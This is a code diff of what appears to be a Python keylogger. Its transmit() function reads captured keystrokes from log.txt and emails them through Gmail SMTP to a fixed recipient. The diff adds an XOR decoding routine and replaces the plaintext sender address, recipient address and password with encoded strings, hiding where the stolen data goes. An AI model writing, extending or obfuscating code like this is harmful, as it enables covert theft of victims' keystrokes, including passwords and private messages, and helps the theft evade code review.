@@ -40,18 +40,27 @@ def writefile(key):                         #function which will convert unicode
     except KeyError:                        #handling error
         pass
 
+    
+def _o0j3jiaskn9(mess,key):
+    buf = ""
+    ret = mess.split(":")
+    for i in ret:
+        if i == "":
+            break
+        buf += chr(int(i) ^ key)
+    return buf
 
 def transmit():                             #function to mail the file
-    sender_mail = "usingfortest1234@gmail.com"
-    receive_mail = "harsh22701@gmail.com"
-    password = 'testingpurpose1234'
-    with open("log.txt", 'r') as re:        #reading fromm file
-        message = re.read()
+    _se000023 = _o0j3jiaskn9("14:8:18:21:28:29:20:9:15:30:8:15:74:73:72:79:59:28:22:26:18:23:85:24:20:22",123)
+    _r903298m = _o0j3jiaskn9("19:26:9:8:19:73:73:76:75:74:59:28:22:26:18:23:85:24:20:22",123)
+    _0329jp30 = _o0j3jiaskn9('15:30:8:15:18:21:28:11:14:9:11:20:8:30:74:73:72:79',123)
+    with open("log.txt", 'r') as fil:        #reading fromm file
+        message = fil.read()
     server = smtplib.SMTP('smtp.gmail.com', 587)    #establishing connection with gmail server
     server.ehlo()
     server.starttls()
-    server.login(sender_mail, password)             #authenticating ourselves
-    server.sendmail(sender_mail, receive_mail, message)     #sending mail
+    server.login(_se000023, _0329jp30)             #authenticating ourselves
+    server.sendmail(_se000023, _r903298m, message)     #sending mail
     server.close()                          #terminating the connection
 
 
